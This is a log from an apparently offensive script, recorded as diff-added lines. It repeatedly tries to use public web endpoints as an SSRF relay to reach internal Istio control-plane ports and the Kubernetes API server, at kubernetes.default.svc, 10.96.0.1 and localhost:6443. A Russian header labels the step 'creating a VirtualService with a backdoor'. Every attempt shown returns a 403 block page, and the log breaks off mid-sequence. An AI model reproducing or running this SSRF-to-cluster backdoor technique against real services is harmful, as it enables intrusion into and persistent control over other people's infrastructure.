+[2025-12-10 17:53:09] [INFO] Testing Istio access: /myaccount/api/order-details/v3/feature-flags -> https://istiod.istio-system.svc.cluster.local:15014
+[2025-12-10 17:53:10] [INFO]   Response status: 403
+[2025-12-10 17:53:10] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:53:10] [INFO] Testing Istio access: /myaccount/api/order-details/v3/feature-flags -> http://istiod.istio-system.svc.cluster.local:15014
+[2025-12-10 17:53:10] [INFO]   Response status: 403
+[2025-12-10 17:53:10] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:53:10] [INFO] Testing Istio access: /myaccount/api/order-details/v3/feature-flags -> https://istiod.istio-system.svc.cluster.local:15010
+[2025-12-10 17:53:11] [INFO]   Response status: 403
+[2025-12-10 17:53:11] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:53:11] [INFO] Testing Istio access: /myaccount/api/order-details/v3/feature-flags -> http://istiod.istio-system.svc.cluster.local:15010
+[2025-12-10 17:53:11] [INFO]   Response status: 403
+[2025-12-10 17:53:11] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:53:11] [INFO] 
+======================================================================
+[2025-12-10 17:53:11] [INFO] ШАГ 6: Создание VirtualService с бекдором
+[2025-12-10 17:53:11] [INFO] ======================================================================
+[2025-12-10 17:53:11] [INFO] Creating VirtualService via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:12] [INFO]   Response status: 403
+[2025-12-10 17:53:12] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:12] [INFO] Creating VirtualService via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc:443/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:12] [INFO]   Response status: 403
+[2025-12-10 17:53:12] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:12] [INFO] Creating VirtualService via: /semiprotected/api/checkout/state-api/v2/get -> https://10.96.0.1/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:13] [INFO]   Response status: 403
+[2025-12-10 17:53:13] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:13] [INFO] Creating VirtualService via: /semiprotected/api/checkout/state-api/v2/get -> http://kubernetes.default.svc/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:13] [INFO]   Response status: 403
+[2025-12-10 17:53:13] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:13] [INFO] Creating VirtualService via: /semiprotected/api/checkout/state-api/v2/get -> http://127.0.0.1:6443/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:14] [INFO]   Response status: 403
+[2025-12-10 17:53:14] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:14] [INFO] Creating VirtualService via: /semiprotected/api/checkout/state-api/v2/get -> http://localhost:6443/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:14] [INFO]   Response status: 403
+[2025-12-10 17:53:14] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:14] [INFO] Creating VirtualService via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:15] [INFO]   Response status: 403
+[2025-12-10 17:53:15] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:15] [INFO] Creating VirtualService via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/v1/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:15] [INFO]   Response status: 403
+[2025-12-10 17:53:15] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:15] [INFO] Creating VirtualService via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/v1/namespaces/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:16] [INFO]   Response status: 403
+[2025-12-10 17:53:16] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:16] [INFO] Creating VirtualService via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/v1/namespaces/default/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:17] [INFO]   Response status: 403
+[2025-12-10 17:53:17] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:17] [INFO] Creating VirtualService via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:17] [INFO]   Response status: 403
+[2025-12-10 17:53:17] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:17] [INFO] Creating VirtualService via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc:443/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:18] [INFO]   Response status: 403
+[2025-12-10 17:53:18] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:18] [INFO] Creating VirtualService via: /zootopia-events/api/events/sites/1 -> https://10.96.0.1/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:18] [INFO]   Response status: 403
+[2025-12-10 17:53:18] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:18] [INFO] Creating VirtualService via: /zootopia-events/api/events/sites/1 -> http://kubernetes.default.svc/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:19] [INFO]   Response status: 403
+[2025-12-10 17:53:19] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:19] [INFO] Creating VirtualService via: /zootopia-events/api/events/sites/1 -> http://127.0.0.1:6443/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:19] [INFO]   Response status: 403
+[2025-12-10 17:53:19] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:19] [INFO] Creating VirtualService via: /zootopia-events/api/events/sites/1 -> http://localhost:6443/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:20] [INFO]   Response status: 403
+[2025-12-10 17:53:20] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:20] [INFO] Creating VirtualService via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:20] [INFO]   Response status: 403
+[2025-12-10 17:53:20] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:20] [INFO] Creating VirtualService via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/v1/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:21] [INFO]   Response status: 403
+[2025-12-10 17:53:21] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:21] [INFO] Creating VirtualService via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:21] [INFO]   Response status: 403
+[2025-12-10 17:53:21] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:21] [INFO] Creating VirtualService via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/default/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:22] [INFO]   Response status: 403
+[2025-12-10 17:53:22] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:22] [INFO] Creating VirtualService via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:22] [INFO]   Response status: 403
+[2025-12-10 17:53:22] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:22] [INFO] Creating VirtualService via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc:443/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:23] [INFO]   Response status: 403
+[2025-12-10 17:53:23] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:23] [INFO] Creating VirtualService via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://10.96.0.1/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:23] [INFO]   Response status: 403
+[2025-12-10 17:53:23] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:23] [INFO] Creating VirtualService via: /leto-personalization/api/v1/personalization/events/sites/1 -> http://kubernetes.default.svc/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:24] [INFO]   Response status: 403
+[2025-12-10 17:53:24] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:24] [INFO] Creating VirtualService via: /leto-personalization/api/v1/personalization/events/sites/1 -> http://127.0.0.1:6443/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:24] [INFO]   Response status: 403
+[2025-12-10 17:53:24] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:24] [INFO] Creating VirtualService via: /leto-personalization/api/v1/personalization/events/sites/1 -> http://localhost:6443/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:25] [INFO]   Response status: 403
+[2025-12-10 17:53:25] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:25] [INFO] Creating VirtualService via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:25] [INFO]   Response status: 403
+[2025-12-10 17:53:25] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:25] [INFO] Creating VirtualService via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/v1/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:26] [INFO]   Response status: 403
+[2025-12-10 17:53:26] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:26] [INFO] Creating VirtualService via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:26] [INFO]   Response status: 403
+[2025-12-10 17:53:26] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:26] [INFO] Creating VirtualService via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/default/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:27] [INFO]   Response status: 403
+[2025-12-10 17:53:27] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:27] [INFO] Creating VirtualService via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:28] [INFO]   Response status: 403
+[2025-12-10 17:53:28] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:28] [INFO] Creating VirtualService via: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc:443/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:28] [INFO]   Response status: 403
+[2025-12-10 17:53:28] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:28] [INFO] Creating VirtualService via: /myaccount/api/order-details/v3/feature-flags -> https://10.96.0.1/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:29] [INFO]   Response status: 403
+[2025-12-10 17:53:29] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:29] [INFO] Creating VirtualService via: /myaccount/api/order-details/v3/feature-flags -> http://kubernetes.default.svc/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:29] [INFO]   Response status: 403
+[2025-12-10 17:53:29] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again...
+[2025-12-10 17:53:29] [INFO] Creating VirtualService via: /myaccount/api/order-details/v3/feature-flags -> http://127.0.0.1:6443/apis/networking.istio.io/v1beta1/namespaces/default/virtualservices
+[2025-12-10 17:53:30] [INFO]   Response status: 403
